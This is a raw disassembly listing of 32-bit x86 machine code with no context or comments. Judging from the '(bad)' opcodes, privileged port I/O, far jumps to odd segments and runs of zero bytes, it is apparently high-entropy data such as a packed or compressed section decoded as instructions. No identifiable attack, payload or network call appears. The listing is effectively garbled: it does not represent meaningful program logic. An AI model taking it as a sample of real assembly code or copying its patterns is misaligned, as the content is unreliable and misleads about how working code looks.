  41a8c7:	xchg   ebp,eax
  41a8c8:	ja     0x41a85a
  41a8ca:	jns    0x41a8d4
  41a8cc:	cmp    al,0x28
  41a8ce:	push   0x6fa018f1
  41a8d3:	push   esi
  41a8d4:	std    
  41a8d5:	js     0x41a92e
  41a8d7:	push   esi
  41a8d8:	ss jb  0x41a888
  41a8db:	sub    al,0xb
  41a8dd:	sar    DWORD PTR [edi],0x68
  41a8e0:	ret    
  41a8e1:	sub    bl,dh
  41a8e3:	mov    esi,0x9011c925
  41a8e8:	fs jg  0x41a8ad
  41a8eb:	inc    ecx
  41a8ec:	push   0xffffffbf
  41a8ee:	and    DWORD PTR [ecx-0x755b24e],0xe0cdbaad
  41a8f8:	dec    edi
  41a8f9:	add    ebx,edi
  41a8fb:	push   esp
  41a8fc:	(bad)  [edx+0x29]
  41a8ff:	je     0x41a931
  41a901:	pop    es
  41a902:	dec    eax
  41a903:	repz aas 
  41a905:	dec    ebp
  41a906:	mov    ebx,0x74ca32e7
  41a90b:	dec    esp
  41a90c:	xchg   esp,eax
  41a90d:	push   eax
  41a90e:	addr16 enter 0x7cc5,0x89
  41a913:	add    ebx,DWORD PTR [edx+esi*8]
  41a916:	bound  ebx,QWORD PTR [ecx+esi*2]
  41a919:	enter  0xce9f,0xd2
  41a91d:	sbb    edi,DWORD PTR [esi+ebp*2]
  41a920:	dec    esp
  41a921:	pop    ebp
  41a922:	fld    TBYTE PTR es:[ecx+0x2a8cfe53]
  41a929:	in     eax,0x9
  41a92b:	inc    edx
  41a92c:	enter  0x40d,0xc0
  41a930:	push   es
  41a931:	jns    0x41a8e1
  41a933:	xchg   edi,eax
  41a934:	fdiv   DWORD PTR [edi+edx*2]
  41a937:	icebp  
  41a938:	or     edx,DWORD PTR [ecx+0x73]
  41a93b:	popf   
  41a93c:	xor    dh,BYTE PTR [ebx+0x3]
  41a93f:	pop    edx
  41a940:	sbb    BYTE PTR [eax],al
	...
  41a9b2:	add    BYTE PTR [eax],al
  41a9b4:	xor    esi,DWORD PTR [ecx]
  41a9b6:	xchg   ebx,eax
  41a9b7:	lds    edx,FWORD PTR [ebx-0x46088819]
  41a9bd:	icebp  
  41a9be:	cmp    eax,0x177ebd9e
  41a9c3:	sbb    eax,0x11fed
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [eax-0x2c],dh
  41a9ce:	sub    BYTE PTR [edi-0x35],ch
  41a9d1:	inc    esp
  41a9d2:	(bad)  
  41a9d3:	and    BYTE PTR [edi+0x2a89f03e],bl
  41a9d9:	stos   BYTE PTR es:[edi],al
  41a9da:	(bad)  
  41a9dc:	xchg   esp,eax
  41a9dd:	push   ebx
  41a9de:	push   ebx
  41a9df:	loop   0x41a9d3
  41a9e1:	or     eax,0xc43c9021
  41a9e6:	pop    ecx
  41a9e7:	and    al,BYTE PTR [ebx]
  41a9e9:	pusha  
  41a9ea:	gs pop es
  41a9ec:	ds or  eax,0xce478df9
  41a9f2:	jmp    0x41aa4b
  41a9f4:	push   ss
  41a9f5:	loope  0x41a9bf
  41a9f7:	jb     0x41aa30
  41a9f9:	imul   esi,DWORD PTR [ebp-0x4e],0xffffffa1
  41a9fd:	xchg   edx,eax
  41a9fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ff:	inc    ecx
  41aa00:	xchg   esi,eax
  41aa01:	xchg   BYTE PTR [edx-0x4066db65],cl
  41aa07:	sub    DWORD PTR [edx],edi
  41aa09:	jns    0x41aa18
  41aa0b:	int    0x6f
  41aa0d:	jmp    0x41aa8a
  41aa0f:	add    esp,DWORD PTR ss:[ebx]
  41aa12:	cwde   
  41aa13:	mov    esi,0x735db9fa
  41aa18:	pop    ss
  41aa19:	dec    ecx
  41aa1a:	add    eax,0x3b57a261
  41aa1f:	imul   DWORD PTR [ebx+ecx*8]
  41aa22:	pusha  
  41aa23:	push   ss
  41aa24:	jle    0x41aa8a
  41aa26:	imul   esi,DWORD PTR [eax],0x3621e48d
  41aa2c:	fist   DWORD PTR ds:0x9695f168
  41aa32:	sahf   
  41aa33:	push   es
  41aa34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa35:	mov    esp,0x10a43ce1
  41aa3a:	call   0xe224a0ac
  41aa3f:	sahf   
  41aa40:	mov    edx,DWORD PTR [edi+0x71]
  41aa43:	outs   dx,BYTE PTR ds:[esi]
  41aa44:	and    ebp,DWORD PTR [esi+0x6d]
  41aa47:	(bad)  
  41aa48:	hlt    
  41aa49:	aas    
  41aa4a:	lahf   
  41aa4b:	sub    al,0x9f
  41aa4d:	push   ebp
  41aa4e:	mov    eax,ds:0x4c4d23f7
  41aa53:	xor    eax,ebp
  41aa55:	jbe    0x41aaa7
  41aa57:	jbe    0x41aa37
  41aa59:	aaa    
  41aa5a:	adc    ch,BYTE PTR [ecx+0x43]
  41aa5d:	jbe    0x41aacd
  41aa5f:	adc    eax,DWORD PTR [esi+ecx*8]
  41aa62:	inc    ebx
  41aa63:	xor    DWORD PTR [esi+edi*4+0x4a],edx
  41aa67:	pop    ebx
  41aa68:	out    dx,al
  41aa69:	xlat   BYTE PTR ds:[ebx]
  41aa6a:	push   esp
  41aa6b:	fwait
  41aa6c:	xor    eax,0x96525b6b
  41aa71:	push   es
  41aa72:	stc    
  41aa73:	jno    0x41aab3
  41aa75:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41aa77:	jne    0x41aa60
  41aa79:	mov    eax,edi
  41aa7b:	push   ebp
  41aa7c:	cs pop ebx
  41aa7e:	jne    0x41aa5e
  41aa80:	int    0x56
  41aa82:	fbld   TBYTE PTR [eax]
  41aa84:	or     eax,0xfc2276c2
  41aa89:	aas    
  41aa8a:	outs   dx,BYTE PTR ds:[esi]
  41aa8b:	mov    cl,0x12
  41aa8d:	stos   BYTE PTR es:[edi],al
  41aa8e:	enter  0x8270,0xa0
  41aa92:	fwait
  41aa93:	sahf   
  41aa94:	mov    esi,0x566f7a96
  41aa99:	jnp    0x41aaf1
  41aa9b:	pusha  
  41aa9c:	js     0x41aaba
  41aa9e:	pop    ecx
  41aa9f:	push   edx
  41aaa0:	or     dh,ah
  41aaa2:	pop    esp
  41aaa3:	addr16 push 0x874304da
  41aaa9:	rol    BYTE PTR [esi+0x215f21f3],cl
  41aaaf:	nop
  41aab0:	inc    ebp
  41aab1:	mov    ecx,0x719c6017
  41aab6:	mov    esi,0xb93c38f9
  41aabb:	xor    eax,0x21295fd4
  41aac0:	dec    ebx
	...
  41ab31:	add    BYTE PTR [eax],al
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi+0x27]
  41ab41:	sub    cl,BYTE PTR [edx+0x120e250]
  41ab47:	add    ch,dh
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR [ebp+0x63],ah
  41ab4e:	xor    DWORD PTR [eax],ecx
  41ab50:	jg     0x41ab36
  41ab52:	xchg   ebp,eax
  41ab53:	dec    edi
  41ab54:	repz sub al,0xc6
  41ab57:	add    eax,0x7795000
  41ab5c:	pop    edx
  41ab5d:	stc    
  41ab5e:	sub    DWORD PTR [esi],0x3d
  41ab61:	leave  
  41ab62:	loop   0x41ab32
  41ab64:	or     eax,0x2d66c768
  41ab69:	mov    ah,0x6d
  41ab6b:	repnz out dx,al
  41ab6d:	lock xchg ecx,eax
  41ab6f:	or     eax,0xa3f658b9
  41ab74:	ds fs or bh,bh
  41ab78:	pop    ss
  41ab79:	mov    al,ds:0x29c563bc
  41ab7e:	cs sar dh,cl
  41ab81:	sub    eax,0xfd0bfbf9
  41ab86:	aad    0xb1
  41ab88:	inc    esi
  41ab89:	adc    BYTE PTR [ebp-0x48],bh
  41ab8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab8d:	jge    0x41ab6d
  41ab8f:	push   ss
  41ab90:	cli    
  41ab91:	mov    ebp,0x78148b67
  41ab96:	add    al,0x3f
  41ab98:	stos   BYTE PTR es:[edi],al
  41ab99:	js     0x41ab30
  41ab9b:	add    DWORD PTR [eax-0xa],ebp
  41ab9e:	xor    DWORD PTR [esi+eiz*2-0x25438beb],esi
  41aba5:	jge    0x41abc9
  41aba7:	mov    ?,WORD PTR [edi+eax*1]
  41abaa:	fcomip st,st(4)
  41abac:	and    eax,0xd5b2aef4
  41abb1:	xor    dl,dl
  41abb3:	test   DWORD PTR [edi],0x2ed6896
  41abb9:	es mov esi,0xa947ea42
  41abbf:	sub    eax,esi
  41abc1:	call   0x32e9e727
  41abc6:	das    
  41abc7:	pop    ebx
  41abc8:	jo     0x41ac2a
  41abca:	lods   eax,DWORD PTR ds:[esi]
  41abcb:	xchg   ebx,eax
  41abcc:	cmp    eax,0x6a61aa22
  41abd1:	xchg   ebp,eax
  41abd2:	xchg   ebp,eax
  41abd3:	test   DWORD PTR ds:0x1ef28b6c,ecx
  41abd9:	in     eax,0x4c
  41abdb:	adc    BYTE PTR [eax-0x5a],al
  41abde:	push   esp
  41abdf:	push   edi
  41abe0:	mov    ch,0x77
  41abe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe3:	les    edx,FWORD PTR ss:[esp+edx*8+0xcadb03e]
  41abeb:	dec    edx
  41abec:	sub    eax,0xc33a74b4
  41abf1:	out    0x55,al
  41abf3:	sbb    al,0xad
  41abf5:	inc    ebp
  41abf6:	sub    eax,DWORD PTR [eax]
  41abf8:	popa   
  41abf9:	aad    0x5a
  41abfb:	test   eax,0x5e678c85
  41ac00:	push   esi
  41ac01:	imul   ecx,DWORD PTR [ebp+0x3d],0x57
  41ac05:	jl     0x41ac78
  41ac07:	add    edx,DWORD PTR [edx+0x5f]
  41ac0a:	loope  0x41abae
  41ac0c:	ins    BYTE PTR es:[edi],dx
  41ac0d:	popf   
  41ac0e:	sahf   
  41ac0f:	leave  
  41ac10:	add    ebx,DWORD PTR [ecx+0x57]
  41ac13:	adc    al,0xe9
  41ac15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac16:	jnp    0x41ac7c
  41ac18:	or     al,0x9a
  41ac1a:	add    al,0xee
  41ac1c:	cld    
  41ac1d:	fstp   TBYTE PTR [edx+0x300f6b9f]
  41ac23:	loope  0x41ac9f
  41ac25:	pop    edi
  41ac26:	pop    ebp
  41ac27:	xor    DWORD PTR [ecx],edx
  41ac29:	sub    eax,0xc1649768
  41ac2e:	mov    ebx,0x778d431d
  41ac33:	aaa    
  41ac34:	daa    
  41ac35:	cmp    al,0x73
  41ac37:	jno    0x41ac88
  41ac39:	xor    ebx,DWORD PTR [edx+0xe264359]
  41ac3f:	mov    eax,0x4a
	...
  41acb4:	lock xchg edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x823e3e02
  41acc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc4:	xlat   BYTE PTR ds:[ebx]
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    BYTE PTR [eax-0x1d],bl
  41acce:	lods   eax,DWORD PTR ds:[esi]
  41accf:	or     al,0x6b
  41acd1:	ret    
  41acd2:	loopne 0x41ac89
  41acd4:	or     al,0x4f
  41acd6:	in     eax,dx
  41acd7:	add    bl,BYTE PTR [ebp+0x8103e48]
  41acdd:	jo     0x41ad43
  41acdf:	push   ds
  41ace0:	cmp    ch,BYTE PTR [edx+0x1dc9c12]
  41ace6:	int3   
  41ace7:	mov    ch,0x7e
  41ace9:	inc    eax
  41acea:	lock jmp 0x41ad2f
  41aced:	(bad)  [ecx]
  41acef:	je     0x41acec
  41acf1:	imul   esp,DWORD PTR [ecx+0x6f],0xdd818804
  41acf8:	jno    0x41ad22
  41acfa:	pop    ecx
  41acfb:	les    ecx,FWORD PTR [edx-0x4b]
  41acfe:	mov    BYTE PTR [eax+0x124c40c1],0x99
  41ad05:	stc    
  41ad06:	popa   
  41ad07:	ret    
  41ad08:	(bad)  
  41ad0a:	nop
  41ad0b:	jle    0x41ad88
  41ad0d:	fidivr DWORD PTR [eax+0x2a]
  41ad10:	mov    BYTE PTR [edi+edi*1+0x3fa3e48e],al
  41ad17:	xchg   ebx,eax
  41ad18:	mov    ds:0x701657ae,eax
  41ad1d:	xchg   ebp,eax
  41ad1e:	fldenv [esi]
  41ad20:	test   DWORD PTR [esi-0xb30acae],ebx
  41ad26:	jp     0x41ad43
  41ad28:	and    BYTE PTR [ebp-0x3f],dh
  41ad2b:	jg     0x41ad5d
  41ad2d:	stc    
  41ad2e:	repnz push esi
  41ad30:	not    BYTE PTR [ecx-0x697610dd]
  41ad36:	pusha  
  41ad37:	and    eax,0x8bf52a9b
  41ad3c:	inc    esi
  41ad3d:	or     BYTE PTR [edx],bl
  41ad3f:	fwait
  41ad40:	sub    DWORD PTR [ecx+0x7e],ebp
  41ad43:	inc    esp
  41ad44:	xor    BYTE PTR [ecx+0xd],bl
  41ad47:	test   BYTE PTR [ebp-0x7c90233b],ch
  41ad4d:	retf   
  41ad4e:	adc    BYTE PTR [ebx],bl
  41ad50:	cmp    eax,DWORD PTR [edx]
  41ad52:	in     al,0xa6
  41ad54:	jmp    0x1315:0xc86dd62
  41ad5b:	sub    BYTE PTR [ebx+0x34],ah
  41ad5e:	mov    ch,0x39
  41ad60:	jo     0x41ad05
  41ad62:	or     DWORD PTR [edx+0x23c88ca8],esi
  41ad68:	jg     0x41ad62
  41ad6a:	retf   
  41ad6b:	push   0xffffffbf
  41ad6d:	fst    QWORD PTR [ebx-0x5303cdd5]
  41ad73:	add    BYTE PTR [ecx+0x3],0x20
  41ad77:	sub    DWORD PTR [edx-0x3a],ebx
  41ad7a:	push   edx
  41ad7b:	pusha  
  41ad7c:	cmp    eax,DWORD PTR [edx-0x1c4c37ac]
  41ad82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad83:	(bad)  
  41ad84:	adc    al,0x47
  41ad86:	and    edx,edi
  41ad88:	or     eax,eax
  41ad8a:	pop    ebx
  41ad8b:	jg     0x41ad8c
  41ad8d:	iret   
  41ad8e:	aam    0x64
  41ad90:	dec    esi
  41ad91:	sbb    cl,BYTE PTR [ebp+0x2b]
  41ad94:	xchg   esp,eax
  41ad95:	jge    0x41ae07
  41ad97:	cmp    DWORD PTR [edi],esp
  41ad99:	dec    edx
  41ad9a:	ret    0xe040
  41ad9d:	pop    ecx
  41ad9e:	mov    cl,0x5f
  41ada0:	inc    ebp
  41ada1:	cmp    DWORD PTR [edx+0x70ba8563],eax
  41ada7:	or     al,0x7f
  41ada9:	mov    ebx,0xa745d379
  41adae:	iret   
  41adaf:	lods   al,BYTE PTR ds:[esi]
  41adb0:	jle    0x41add3
  41adb2:	xor    ch,BYTE PTR ds:0xd78baec
  41adb8:	add    BYTE PTR [edi],0x24
  41adbb:	dec    ebp
  41adbc:	in     eax,0x46
  41adbe:	mov    ecx,0x1ee8
	...
  41ae33:	add    BYTE PTR [edi+0x5fc517d8],al
  41ae39:	iret   
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x6177741d]
  41ae41:	xchg   edi,eax
  41ae42:	push   es
  41ae43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae44:	int3   
  41ae45:	and    al,BYTE PTR [ecx]
  41ae47:	add    ch,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [eax+0x46],al
  41ae4e:	jae    0x41adfe
  41ae50:	push   esi
  41ae51:	out    0x9b,al
  41ae53:	dec    esp
  41ae54:	stos   BYTE PTR es:[edi],al
  41ae55:	aas    
  41ae56:	sbb    ecx,edi
  41ae58:	sbb    al,dl
  41ae5a:	sub    ch,BYTE PTR [eax]
  41ae5c:	jnp    0x41ae4e
  41ae5e:	xchg   ecx,eax
  41ae5f:	mov    ds:0x7a4373ec,eax
  41ae64:	daa    
  41ae65:	in     al,0xf4
  41ae67:	sub    BYTE PTR [edi+0x1784bf83],ah
  41ae6d:	jle    0x41ae05
  41ae6f:	int3   
  41ae70:	dec    esp
  41ae71:	jecxz  0x41ae87
  41ae73:	int    0x1f
  41ae75:	mov    DWORD PTR [ebp+0x31],ebp
  41ae78:	pop    esi
  41ae79:	js     0x41ae08
  41ae7b:	adc    eax,0x50fffb71
  41ae80:	mov    al,ds:0x5536a8c7
  41ae85:	scas   al,BYTE PTR es:[edi]
  41ae86:	imul   ecx,DWORD PTR [edi-0x627a6aa1],0x2f
  41ae8d:	(bad)  
  41ae8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae8f:	mov    eax,ds:0x348ec15c
  41ae94:	and    edi,DWORD PTR [esi]
  41ae96:	(bad)  
  41ae97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae99:	xchg   esp,eax
  41ae9a:	adc    DWORD PTR [ecx],0x33566178
  41aea0:	rol    BYTE PTR [ebx-0x3f02bd30],0xae
  41aea7:	push   ebp
  41aea8:	arpl   WORD PTR [esi+eax*1+0x1e],sp
  41aeac:	sbb    bh,BYTE PTR [edi-0x56]
  41aeaf:	inc    ebp
  41aeb0:	xchg   DWORD PTR [ebp-0x3739dd4a],edx
  41aeb6:	xchg   ecx,eax
  41aeb7:	inc    esi
  41aeb8:	pushf  
  41aeb9:	mov    edi,0x3de5c532
  41aebe:	mov    esi,0x1ec207fb
  41aec3:	adc    ch,BYTE PTR [edi-0x30f71e29]
  41aec9:	mov    al,0x28
  41aecb:	or     DWORD PTR ds:0x898f43e6,0x7a960ec3
  41aed5:	xor    eax,0x3ab37eca
  41aeda:	imul   edi,ebp,0xdb5b92b5
  41aee0:	push   0x34faecd6
  41aee5:	xor    BYTE PTR [ebx-0x2d],dh
  41aee8:	aam    0xfa
  41aeea:	mov    ecx,0xef3e324b
  41aeef:	add    cl,BYTE PTR [eax]
  41aef1:	jae    0x41ae9d
  41aef3:	(bad)  
  41aef4:	call   0xfc71:0x3c60019e
  41aefb:	push   edi
  41aefc:	lahf   
  41aefd:	iret   
  41aefe:	test   al,0xce
  41af00:	mov    esp,0xe871c716
  41af05:	mov    esi,0x730cbbdd
  41af0a:	jne    0x41af39
  41af0c:	sbb    esp,DWORD PTR [esi+0xd]
  41af0f:	fistp  DWORD PTR [ebp-0x4c]
  41af12:	rcr    BYTE PTR [di],1
  41af15:	xor    edi,edi
  41af17:	xchg   edx,eax
  41af18:	cmc    
  41af19:	inc    ebx
  41af1a:	jecxz  0x41af0b
  41af1c:	mov    BYTE PTR [ebp+esi*2-0x4e],dl
  41af20:	mov    al,0x23
  41af22:	push   ss
  41af23:	jnp    0x41aefb
  41af25:	rcl    BYTE PTR [ebx+0x38d90131],1
  41af2b:	(bad)  
  41af2c:	mov    esi,esp
  41af2e:	out    0x40,al
  41af30:	out    0xbd,al
  41af32:	inc    esp
  41af33:	int    0x2
  41af35:	call   0x43a0c148
  41af3a:	test   al,0x91
  41af3c:	leave  
  41af3d:	xchg   DWORD PTR [edx],ecx
  41af3f:	xchg   BYTE PTR [eax+0x0],dl
	...
  41afb2:	add    BYTE PTR [eax],al
  41afb4:	dec    esi
  41afb5:	jmp    0x41afe1
  41afb7:	dec    esi
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x2f
  41afc1:	out    0x59,eax
  41afc3:	add    eax,ecx
  41afc5:	and    eax,DWORD PTR [ecx]
  41afc7:	add    ch,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [ebp-0x56],ch
  41afce:	pop    esi
  41afcf:	pop    esi
  41afd0:	sbb    eax,0x105055ce
  41afd5:	test   edi,0x1e3e1d59
  41afdb:	daa    
  41afdc:	jmp    DWORD PTR ds:0xf6c94d75
  41afe2:	shl    BYTE PTR [edx+0x2],cl
  41afe5:	div    DWORD PTR [ebp+0x74feaaa6]
  41afeb:	enter  0xa997,0xb9
  41afef:	dec    eax
  41aff0:	mov    DWORD PTR [eax-0x144980c5],edx
  41aff6:	pop    edi
  41aff7:	call   0x8f2a:0xd18de04a
  41affe:	cld    
  41afff:	jge    0x41b030
  41b001:	enter  0x7fe6,0x54
  41b005:	addr16 dec edx
  41b007:	cs jl  0x41b014
  41b00a:	std    
  41b00b:	cmp    esp,DWORD PTR [esp-0x450c4563]
  41b012:	inc    esp
  41b013:	retf   0x361f
  41b016:	(bad)  
  41b017:	xor    DWORD PTR gs:[edx-0x3],esi
  41b01b:	aad    0x9
  41b01d:	fmul   st,st(4)
  41b01f:	adc    BYTE PTR [edx],dl
  41b021:	ficom  DWORD PTR [esi]
  41b023:	cmp    esp,DWORD PTR gs:[eax+edi*4]
  41b027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b028:	or     edx,ecx
  41b02a:	in     al,dx
  41b02b:	push   ss
  41b02c:	add    DWORD PTR [ebx-0x65],edx
  41b02f:	sub    eax,0xf814ebeb
  41b034:	in     al,0x19
  41b036:	and    eax,0xa89905da
  41b03b:	out    0xb,eax
  41b03d:	fisub  DWORD PTR [ecx]
  41b03f:	adc    esp,eax
  41b041:	addr16 xchg bl,ch
  41b044:	ins    DWORD PTR es:[edi],dx
  41b045:	dec    edx
  41b046:	mov    bh,0xad
  41b048:	outs   dx,BYTE PTR ds:[esi]
  41b049:	cs cdq 
  41b04b:	popf   
  41b04c:	jle    0x41b045
  41b04e:	aam    0xa7
  41b050:	sbb    BYTE PTR [ecx],al
  41b052:	icebp  
  41b053:	pop    ebx
  41b054:	xor    ebp,DWORD PTR ds:0x9a375237
  41b05a:	ret    0x744b
  41b05d:	mov    eax,?
  41b05f:	sub    BYTE PTR [ebx-0x26],0xcd
  41b063:	pop    edx
  41b064:	xchg   edx,eax
  41b065:	hlt    
  41b066:	push   0x27
  41b068:	pop    esi
  41b069:	mov    dl,0xbe
  41b06b:	dec    ebp
  41b06c:	jae    0x41b04f
  41b06e:	inc    esp
  41b06f:	pushf  
  41b070:	test   DWORD PTR [ebp-0x5076021a],ecx
  41b076:	fsub   DWORD PTR [ebp+0x28b42049]
  41b07c:	test   eax,0xf0637e93
  41b081:	pop    eax
  41b082:	mov    esp,0xbe0afbf0
  41b087:	push   ds
  41b088:	push   ds
  41b089:	lds    ebx,FWORD PTR [ecx+edi*2+0x3560d54a]
  41b090:	and    al,0xce
  41b092:	in     eax,dx
  41b093:	dec    ebp
  41b094:	mov    ah,BYTE PTR ds:0x5a5596ff
  41b09a:	sbb    BYTE PTR [edx-0x73cbbe23],cl
  41b0a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a1:	stc    
  41b0a2:	push   edi
  41b0a3:	popa   
  41b0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0a5:	test   eax,0x5db747ab
  41b0aa:	xchg   ebp,eax
  41b0ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ac:	mov    cl,0x7
  41b0ae:	mov    dl,0xf3
  41b0b0:	test   al,0xa5
  41b0b2:	mov    ebp,ds
  41b0b4:	cmp    DWORD PTR [ebp+0x12b0275f],esp
  41b0ba:	mov    ebp,0x59ff4ad0
  41b0bf:	test   BYTE PTR [ebx],cl
	...
  41b131:	add    BYTE PTR [eax],al
  41b133:	add    BYTE PTR [esp+ecx*1],bl
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	adc    ebp,ebx
  41b142:	cs aaa 
  41b144:	mov    dh,0x24
  41b146:	add    DWORD PTR [eax],eax
  41b148:	cmc    
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [edx-0x3d4fbdcc],al
  41b151:	ja     0x41b136
  41b153:	xchg   BYTE PTR [ebp+0x20058929],dh
  41b159:	mov    ch,0x3c
  41b15b:	sbb    DWORD PTR ds:0x677c211,0xe2d34f1d
  41b165:	loope  0x41b12c
  41b167:	mov    al,ds:0xe6aa9d70
  41b16c:	xchg   edx,eax
  41b16d:	adc    ch,0xec
  41b170:	inc    ecx
  41b171:	out    dx,al
  41b172:	push   edi
  41b173:	push   eax
  41b174:	jp     0x41b1e3
  41b176:	repz mov ecx,0xd97a6d9
  41b17c:	mov    ch,0xf9
  41b17e:	es ja  0x41b144
  41b181:	mov    bh,0x49
  41b183:	scas   al,BYTE PTR es:[edi]
  41b184:	jb     0x41b1b1
  41b186:	in     eax,0xc1
  41b188:	dec    eax
  41b189:	mov    ds:0x879c72ac,al
  41b18e:	jl     0x41b112
  41b190:	mov    bh,0x57
  41b192:	imul   ebp,DWORD PTR [ebx-0x1c],0xffffff81
  41b196:	mov    ah,0xc3
  41b198:	je     0x41b165
  41b19a:	mov    ah,0x4b
  41b19c:	fucomi st,st(5)
  41b19e:	add    eax,0xd40c63d2
  41b1a3:	mov    esi,DWORD PTR [ebp-0x105188b0]
  41b1a9:	retf   0x9f8b
  41b1ac:	mov    eax,ds:0x4a0235cd
  41b1b1:	out    0x65,eax
  41b1b3:	test   BYTE PTR [esi],cl
  41b1b5:	leave  
  41b1b6:	lea    esi,[eax]
  41b1b8:	push   edx
  41b1b9:	leave  
  41b1ba:	iret   
  41b1bb:	dec    edx
  41b1bc:	out    dx,al
  41b1bd:	add    eax,0x9b0dcd
  41b1c2:	repz cmp eax,0x3edb547f
  41b1c8:	adc    ebp,eax
  41b1ca:	inc    ebp
  41b1cb:	(bad)  
  41b1cc:	push   esi
  41b1cd:	pop    ss
  41b1ce:	stc    
  41b1cf:	inc    edx
  41b1d0:	cmc    
  41b1d1:	stos   DWORD PTR es:[edi],eax
  41b1d2:	aam    0xe9
  41b1d4:	leave  
  41b1d5:	push   cs
  41b1d6:	mov    esp,edi
  41b1d8:	in     al,0x94
  41b1da:	jmp    0x41b236
  41b1dc:	mul    BYTE PTR [ebp-0x49]
  41b1df:	(bad)  
  41b1e0:	in     al,0x8b
  41b1e2:	sbb    eax,0xcfc24979
  41b1e7:	xchg   edx,eax
  41b1e8:	fld    QWORD PTR [ebx]
  41b1ea:	xor    eax,0x5ab862ff
  41b1ef:	out    dx,eax
  41b1f0:	or     BYTE PTR [edx-0x5f],ch
  41b1f3:	dec    eax
  41b1f4:	mov    ds:0x602147cc,al
  41b1f9:	test   DWORD PTR gs:[edx+0x60],esp
  41b1fd:	outs   dx,DWORD PTR ds:[esi]
  41b1fe:	fs out 0x91,al
  41b201:	leave  
  41b202:	out    0x59,al
  41b204:	push   ebp
  41b205:	repz mov ah,BYTE PTR [edi+edi*4+0x32c2f8cb]
  41b20d:	cmp    BYTE PTR [esp+edi*4-0x5a4fbb19],ch
  41b214:	das    
  41b215:	jle    0x41b1f6
  41b217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b218:	add    BYTE PTR [ebp+0x2d418177],ah
  41b21e:	dec    ecx
  41b21f:	dec    ebp
  41b220:	(bad)  
  41b221:	lods   eax,DWORD PTR ds:[esi]
  41b222:	sbb    dh,cl
  41b224:	cmp    ecx,0x993e7503
  41b22a:	and    bh,ah
  41b22c:	fscale 
  41b22e:	fwait
  41b22f:	ss in  eax,0xcb
  41b232:	shr    DWORD PTR gs:[eax],0x18
  41b236:	jno    0x41b2a8
  41b238:	mov    ds:0x1a2eabd3,al
  41b23d:	sbb    bl,BYTE PTR [edx+0xe]
  41b240:	push   ss
	...
  41b2b1:	add    BYTE PTR [eax],al
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	clc    
  41b2c1:	repz fsubr QWORD PTR [ecx+0x125ab]
  41b2c8:	cmc    
  41b2c9:	add    BYTE PTR [eax],al
  41b2cb:	add    dl,dh
  41b2cd:	retf   
  41b2ce:	fimul  DWORD PTR [ebx+0x4e]
  41b2d1:	add    BYTE PTR [esi],ah
  41b2d3:	or     ebp,edi
  41b2d5:	sub    DWORD PTR [edi],ebx
  41b2d7:	push   ds
  41b2d8:	or     cl,BYTE PTR [ecx-0x12]
  41b2db:	add    al,0x83
  41b2de:	int3   
  41b2df:	mov    ch,0xce
  41b2e1:	push   cs
  41b2e2:	push   0xffffffed
  41b2e4:	and    esi,DWORD PTR [ebx-0x55529b93]
  41b2ea:	xchg   edx,eax
  41b2eb:	sbb    BYTE PTR cs:[ebx-0x4a5036f5],cl
  41b2f2:	dec    esp
  41b2f3:	or     al,0xa7
  41b2f5:	mov    ecx,DWORD PTR [ebx]
  41b2f7:	retf   0x1a93
  41b2fa:	dec    ebp
  41b2fb:	inc    esi
  41b2fc:	js     0x41b32d
  41b2fe:	rcl    BYTE PTR ds:0x94b06186,0x0
  41b305:	mov    edx,0x6adaca15
  41b30a:	or     DWORD PTR [ecx+0x237d6f3],ebx
  41b310:	mov    eax,ds:0x9f986a23
  41b315:	mov    esp,0x1bea0f35
  41b31a:	jmp    0x36ea:0x2353beea
  41b321:	pop    es
  41b322:	fldcw  WORD PTR [esi+eax*4+0x6d84763e]
  41b329:	push   esi
